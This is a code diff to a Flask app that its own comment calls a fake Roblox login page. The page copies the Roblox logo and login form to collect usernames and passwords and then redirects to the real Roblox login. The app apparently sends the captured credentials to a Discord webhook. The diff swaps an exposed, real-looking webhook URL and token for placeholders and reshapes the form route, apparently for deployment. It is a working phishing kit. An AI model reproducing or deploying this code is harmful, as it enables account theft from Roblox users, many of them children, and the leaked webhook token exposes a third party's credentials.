@@ -5,7 +5,7 @@ import datetime
 app = Flask(__name__)
 
 # Discord webhook URL (replace with your own)
-WEBHOOK_URL = "https://discord.com/api/webhooks/1392456084429738024/CFTns1JQE6e8GJ-vS4rA2d4i2fYEdc1GXivTyGi0YNG2QX7uCvxRek5l-UL5uY2IBBLu"
+WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"
 
 # HTML template for the fake login page
 LOGIN_PAGE = """
@@ -74,7 +74,7 @@ LOGIN_PAGE = """
     <div class="login-container">
         <img src="https://www.roblox.com/images/logo.png" alt="Roblox Logo">
         <h2>Log In to Roblox</h2>
-        <form method="POST" action="/login">
+        <form method="POST" action="/api/login">
             <input type="text" id="username" name="username" placeholder="Username or Email" required>
             <input type="password" id="password" name="password" placeholder="Password" required>
             <button type="submit">Log In</button>
@@ -123,6 +123,3 @@ def login():
 
     # Redirect to official Roblox login page
     return redirect("https://www.roblox.com/login")
-
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000)
